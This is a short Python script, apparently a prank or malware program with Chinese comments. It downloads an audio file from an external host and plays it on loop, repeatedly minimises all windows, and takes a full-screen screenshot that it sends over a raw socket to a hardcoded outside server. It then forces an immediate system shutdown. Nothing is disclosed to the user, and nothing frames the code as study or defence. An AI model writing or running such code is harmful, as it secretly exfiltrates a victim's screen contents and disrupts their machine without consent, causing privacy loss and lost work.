import socket
from PIL import ImageGrab
import random
import os
import pydirectinput
import pyautogui
import subprocess
import pygame
import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor

HOST = 'ip.gresh.top'
PORT = 1234




def send_file(filename):
    file_size = os.path.getsize(filename)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        with open(filename, 'rb') as file:
            bytes_sent = 0
            while bytes_sent < file_size:
                data = file.read(1024)
                client_socket.send(data)
                bytes_sent += len(data)


def capture_screen(x, y, width, height):
    screenshot = ImageGrab.grab(bbox=(x, y, x + width, y + height))
    screenshot.save('screenshot.png')


def get_screenshot():
    screen_width, screen_height = ImageGrab.grab().size
    capture_screen(0, 0, screen_width, screen_height)


def win_m():
    # pyautogui
    pyautogui.keyDown('win')
    pyautogui.press('m')
    pyautogui.keyUp('win')

    # pydirectinput
    pydirectinput.keyDown('win')
    pydirectinput.press('m')
    pydirectinput.keyUp('win')

def run_cmd(cmd):
    proc = subprocess.run(cmd, stdout=subprocess.PIPE)
    output = proc.stdout.decode("utf-8", errors="ignore")
    return output


def play_sound(sound_file):
    """
    播放声音文件

    Args:
        sound_file: 声音文件路径
    """
    sound = pygame.mixer.Sound(sound_file)
    sound.play(loops=-1)


def download_file(url, filename):
    response = requests.get(url, stream=True)
    with open(filename, "wb") as fd:
        for chunk in response.iter_content(chunk_size=525):
            fd.write(chunk)



def download_km3():
    url = ["https://raw.githubusercontent.com/GreshAnt/Zink/main/KM3.mp3", "https://jrc.ink/f/yoqhL/KM3.ipa", "https://file.uhsea.com/2312/3b9def6906e500f82afe1faacd7fea7c8F.mp3"]

    filename = "KM3.hack"
    # try:
    #     download_file(url[0], filename)
    # except Exception:
    #     try:
    #         download_file(url[1], filename)
    #     except Exception:dddddd
    #         download_file(url[2], filename)
    download_file(url[2], filename)
    return filename

def main():
    filename = download_km3()

    pygame.init()

    # 创建一个播放声音的线程

    thread = threading.Thread(target=play_sound, args=(filename,))
    thread.daemon = True
    thread.start()

    # while True:
    #     pass

    win_m()
    get_screenshot()
    send_file('screenshot.png')
    win_m()
    for _ in range(0, random.randint(50, 80)):
        time.sleep(2)
        win_m()
    run_cmd('shutdown -s -t 0')


if __name__ == '__main__':
    main()
